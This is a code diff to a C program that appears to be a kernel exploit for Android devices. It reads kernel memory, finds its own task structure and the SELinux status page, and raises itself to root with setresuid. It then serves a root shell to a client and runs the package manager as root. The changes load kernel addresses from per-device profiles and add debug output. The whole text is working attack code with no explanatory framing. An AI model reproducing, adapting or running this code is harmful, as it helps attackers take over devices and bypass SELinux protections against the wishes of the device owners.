@@ -12,6 +12,7 @@
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <malloc.h>
 #include <string.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
@@ -33,6 +34,7 @@
 #include "gl_profile.h"
 
 static struct gl_profile g_profile;
+static struct gl_runtime g_runtime;
 
 #define INIT_TASK (g_profile.init_task)
 #define PI_TASK (g_profile.pi_task)
@@ -446,7 +448,9 @@ static void set_root_env(void) {
     setenv("USER", "root", 1);
     setenv("LOGNAME", "root", 1);
     setenv("SHELL", "/system/bin/sh", 1);
-    setenv("PS1", "sheldon:${PWD} # ", 1);
+    char ps1[GL_PROFILE_STRING + 16];
+    snprintf(ps1, sizeof(ps1), "%s:${PWD} # ", g_runtime.product);
+    setenv("PS1", ps1, 1);
 }
 
 static void serve_shell(int client, const int *fds, int nfds, const char *cwd) {
@@ -851,10 +855,18 @@ static int kernel_ptr(uint32_t p);
 #define GL_STATUS_SCAN_PAGES 8192
 
 static int gl_status_page_va(int fd, uint32_t *out) {
+    uint32_t status_va = g_profile.selinux_status_page ? g_profile.selinux_status_page
+                                                       : SELINUX_STATUS_PAGE;
+    uint32_t mem_map_va = g_profile.mem_map ? g_profile.mem_map : GL_MEM_MAP;
+    uint32_t pfn_offset_va = g_profile.pfn_offset ? g_profile.pfn_offset : GL_PFN_OFFSET;
     uint32_t page = 0, mem_map = 0, pfnoff = 0;
-    if (!kernel_read_u32(fd, SELINUX_STATUS_PAGE, &page) || !kernel_ptr(page) ||
-        !kernel_read_u32(fd, GL_MEM_MAP, &mem_map) || !kernel_ptr(mem_map) ||
-        !kernel_read_u32(fd, GL_PFN_OFFSET, &pfnoff))
+    int read_ok = kernel_read_u32(fd, status_va, &page) &&
+                  kernel_read_u32(fd, mem_map_va, &mem_map) &&
+                  kernel_read_u32(fd, pfn_offset_va, &pfnoff);
+    dprintf(2, "[perm] status_page=%08x mem_map=%08x pfn_offset=%08x read=%d\n", page, mem_map,
+            pfnoff, read_ok);
+    if (!read_ok || mem_map < 0xc0000000u || page < mem_map || page - mem_map >= 0x2000000u ||
+        ((page - mem_map) & 31u))
         return 0;
     *out = ((pfnoff + ((page - mem_map) >> 5)) << 12) - GL_VA_SUB;
     return 1;
@@ -951,6 +963,7 @@ static int validate_runtime_profile(int fd) {
 }
 
 static uint32_t find_current_task(int fd) {
+    const uint32_t lowmem_min = g_profile.kernel_image_base + g_profile.kernel_size;
     char self_comm[17] = {0};
     prctl(PR_GET_NAME, self_comm, 0, 0, 0);
     uint32_t link = 0;
@@ -963,10 +976,10 @@ static uint32_t find_current_task(int fd) {
     for (unsigned count = 0; count < 4096; count++) {
         if (link == INIT_TASK_TASKS)
             break;
-        if (link < 0xc1000000u || link >= 0xf0000000u || (link & 3u))
+        if (link < lowmem_min || link >= 0xf0000000u || (link & 3u))
             return 0;
         uint32_t task = link - TASK_TASKS_OFF;
-        if (task < 0xc1000000u || task >= 0xf0000000u)
+        if (task < lowmem_min || task >= 0xf0000000u)
             return 0;
         char comm[17] = {0};
         if (kernel_read_once(fd, task + TASK_COMM_OFF, comm, 16) != 16)
@@ -1216,7 +1229,7 @@ static void run_pm(const char *action, const char *pkg) {
         }
         setresgid(0, 0, 0);
         setresuid(0, 0, 0);
-        execl("/system/bin/pm", "pm", action, pkg, (char *)NULL);
+        execl("/system/bin/sh", "sh", "/system/bin/pm", action, pkg, (char *)NULL);
         _exit(127);
     }
     if (c > 0) {
@@ -1356,17 +1369,16 @@ int main(int argc, char **argv) {
     if (g_tries < 1)
         g_tries = 1;
 
-    struct gl_runtime runtime;
     char profile_error[512] = {0};
     char selected_profile[1024] = {0};
-    int ok = gl_runtime_read(&runtime, profile_error, sizeof(profile_error));
+    int ok = gl_runtime_read(&g_runtime, profile_error, sizeof(profile_error));
     if (ok) {
         if (profile_path || profile_directory) {
             ok = gl_profile_select(profile_directory ? profile_directory : "profiles", profile_path,
-                                   &runtime, &g_profile, selected_profile, sizeof(selected_profile),
+                                   &g_runtime, &g_profile, selected_profile, sizeof(selected_profile),
                                    profile_error, sizeof(profile_error));
         } else {
-            ok = gl_profile_select_embedded(&runtime, &g_profile, profile_error,
+            ok = gl_profile_select_embedded(&g_runtime, &g_profile, profile_error,
                                             sizeof(profile_error));
             snprintf(selected_profile, sizeof(selected_profile), "<built-in>");
         }
@@ -1378,7 +1390,7 @@ int main(int argc, char **argv) {
         return 64;
     }
     if (check_profile) {
-        gl_profile_print(&g_profile, &runtime, selected_profile);
+        gl_profile_print(&g_profile, &g_runtime, selected_profile);
         return 0;
     }
     apply_tuning();
